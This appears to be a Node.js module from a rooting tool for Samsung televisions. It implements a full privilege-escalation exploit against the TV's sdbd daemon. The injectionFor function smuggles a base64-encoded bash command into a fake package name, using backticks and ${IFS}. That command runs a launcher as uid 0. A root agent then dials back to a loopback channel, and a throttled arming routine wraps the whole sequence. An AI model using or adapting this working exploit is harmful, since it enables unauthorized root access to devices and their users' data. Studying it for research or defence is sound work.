// Arming root: the three-step sequence that turns the television's sdb daemon
// into a standing root channel.
//
//   1. stage  — copy the signed payloads from the wgt (service/vendor/root-arm)
//               into sdbd's staging root, token written 0600. Idempotent: a
//               re-arm after a reboot restages over the same fixed paths.
//   2. inject — one sdb command, the SVE-2025-50109 package-name injection.
//               sdbd "installs" a package whose name is a shell command that
//               runs the launcher under its own capabilities; the launcher
//               hands the signed tar to sdbd-tarlauncher, which runs launch.sh
//               as uid 0.
//   3. await  — the freshly-started agent dials back to the loopback root
//               channel and authenticates; that connection is the root.
//
// sdbd double-fires every injection, so stage must be idempotent and the
// channel drops a second agent's socket in favour of the first.

'use strict';

const fs = require('fs');
const path = require('path');
const { randomBytes } = require('crypto');

// The vendor tree sits at <pkg>/vendor/root-arm in both the checkout and
// the wgt, but this file runs from <service>/src/root in tests and from
// <service>/dist in the packaged bundle, so try both relative depths (the
// same trick the UI route uses). The manifest is the proof a candidate is real.
const VENDOR = [path.join(__dirname, '..', '..', 'vendor', 'root-arm'),
    path.join(__dirname, '..', '..', '..', 'vendor', 'root-arm')]
    .find((candidate) => fs.existsSync(path.join(candidate, 'manifest.json')));
if (!VENDOR) throw new Error('root-arm payloads are missing — run `npm run rootarm` first');

// Reads service/vendor/root-arm/manifest.json: package name, staging paths,
// callback port. The manifest is the single source of truth for where the
// payloads live, so a rebuild of the vendor tree cannot drift from arm.
function manifest() {
    const raw = fs.readFileSync(path.join(VENDOR, 'manifest.json'), 'utf8');
    const manifest = JSON.parse(raw);
    if (manifest.schemaVersion !== 1) throw new Error(`unsupported root-arm manifest: ${manifest.schemaVersion}`);
    return manifest;
}

function vendorFile(name) {
    return path.join(VENDOR, name);
}

// Copy the vendor payloads into place. Everything is a plain file copy as the
// service user (uid 501), which owns /home/owner/share/tmp. The token is the
// channel's key, so it lands 0600 even though the rest of the tree is
// world-readable.
function stage(log) {
    const spec = manifest();
    const staged: string[] = [];

    for (const name of fs.readdirSync(VENDOR)) {
        if (name === 'manifest.json') continue;
        // The signed tar and its signature land in sdbd's on-demand root, where
        // the launcher looks for <package>.tar.gz; everything else in staging.
        const target = name.endsWith('.tar.gz') || name.endsWith('.signature')
            ? path.join(spec.stagingRoot, 'on-demand', name)
            : path.join(spec.staging, name);

        fs.mkdirSync(path.dirname(target), { recursive: true });
        fs.copyFileSync(vendorFile(name), target);
        if (name === 'root-agent.token') fs.chmodSync(target, 0o600);
        staged.push(target);
        log(`root-arm: staged ${path.basename(target)}`);
    }
    return spec;
}

// The launcher's argument is the package name; the launcher itself lives at a
// fixed path in the staging directory. Kept under the injection's 510-byte
// budget with plenty of room to spare.
function launcherCommand(manifest) {
    return `/usr/bin/dotnet ${manifest.staging}/SamsungTvArchiveRoot.dll ${manifest.package}`;
}

// Same shape the proven CLI shim sends: the payload script is base64 inside a
// fake package name, and ${IFS} keeps it free of literal spaces so sdbd's
// argument parsing never splits it. The mkdir is a no-op guard; the launcher
// runs under sdbd's privileges, not the shell's.
function injectionFor(manifest) {
    const token = randomBytes(8).toString('hex');
    const script = `/bin/mkdir /tmp/s-${token} 2>/dev/null&&{ ${launcherCommand(manifest)};}`;
    const encoded = Buffer.from(script, 'utf8').toString('base64');
    return 'shell:0 appinstall tpk new2.tpk`printf${IFS}%s${IFS}' + encoded + '|base64${IFS}-d|bash`.tpk';
}
// Fire the injection and wait for the agent to dial back in. sdbd double-
// fires every injection, so the second agent simply loses the socket race
// (the channel drops it). The sdb reply is not the authoritative signal: the
// agent usually dials in while sdbd still holds the verb open, up to its 15 s
// timeout. What proves root is the channel connecting with an agent that
// reports uid 0, so that is watched from the moment the injection goes out;
// waiting for the reply first let an install release the agent in between
// and the arm report a failure that was a success.
const ARM_DEADLINE_MS = 45000;

function arm(sdb, channel, log) {
    log = log || (() => {});
    stage(log);

    // A timeout is the usual reply, the agent having dialed in while sdbd held the verb open. Any
    // other failure means sdbd turned the connection away, so the injection never ran.
    let refused: Error | null = null;
    log('root-arm: injecting');
    sdb.withSession({ host: '127.0.0.1' }, (session) =>
        session.exec(injectionFor(manifest()), { timeout: 15000 })
    ).catch((error) => {
        log(`root-arm: sdb reply ${error.code || error.message}`);
        if (error.code !== 'sdbTimeout') refused = error;
    });

    return new Promise<any>((resolve, reject) => {
        const deadline = Date.now() + ARM_DEADLINE_MS;
        function tick() {
            if (channel.connected) return resolve(channel.identity);
            if (refused) return reject(refused);
            if (Date.now() > deadline) return reject(new Error('root-arm: the agent never dialed back in'));
            setTimeout(tick, 500);
        }
        tick();
    }).then((identity) => {
        log(`root-arm: root armed (uid ${identity.uid}, cap ${identity.capEff})`);
        return identity;
    });
}

// Every arm pushes an agent through sdbd, and enough of them in a row lock it
// out until a factory reset (seen on a CU7105 after ~20 cycles in a day). So
// the boot retries, the re-arm after an install and every client of
// POST /dev/root/arm share one arm in flight, and injections are capped per
// hour however many agents are asking.
const ARM_BUDGET = 6;
const ARM_WINDOW_MS = 60 * 60 * 1000;

function createArmer({ sdb, channel, log, onOutcome = (_error: string | null) => {}, armOnce = arm,
    budget = ARM_BUDGET, windowMs = ARM_WINDOW_MS, now = () => Date.now() }) {
    let inFlight: Promise<any> | null = null;
    const injections: number[] = [];

    function recent() {
        const at = now();
        while (injections.length && at - injections[0] >= windowMs) injections.shift();
        return injections.length;
    }

    function retryAfterSeconds() {
        return injections.length ? Math.max(1, Math.ceil((injections[0] + windowMs - now()) / 1000)) : 0;
    }

    function request(reason: string) {
        if (channel.status().root) return Promise.resolve(channel.status().identity);
        if (inFlight) {
            log(`root-arm: ${reason} joined the arm already in flight`);
            return inFlight;
        }

        if (recent() >= budget) {
            const wait = retryAfterSeconds();
            return Promise.reject(Object.assign(new Error(
                `root-arm: ${budget} arms in the last hour already, and sdbd locks out after too many; ` +
                `the next one is allowed in ${wait}s`), { code: 'armBudget', retryAfterSeconds: wait }));
        }

        injections.push(now());
        log(`root-arm: arming for ${reason} (${injections.length}/${budget} this hour)`);

        inFlight = armOnce(sdb, channel, log).then((identity) => {
            inFlight = null;
            onOutcome(null);
            return identity;
        }, (error) => {
            inFlight = null;
            onOutcome(error.message);
            throw error;
        });
        return inFlight;
    }

    function status() {
        const used = recent();
        return {
            arming: !!inFlight,
            armsThisHour: used,
            budget,
            nextArmInSeconds: used >= budget ? retryAfterSeconds() : 0
        };
    }

    return { arm: request, status };
}

module.exports = { manifest, stage, arm, createArmer, VENDOR };
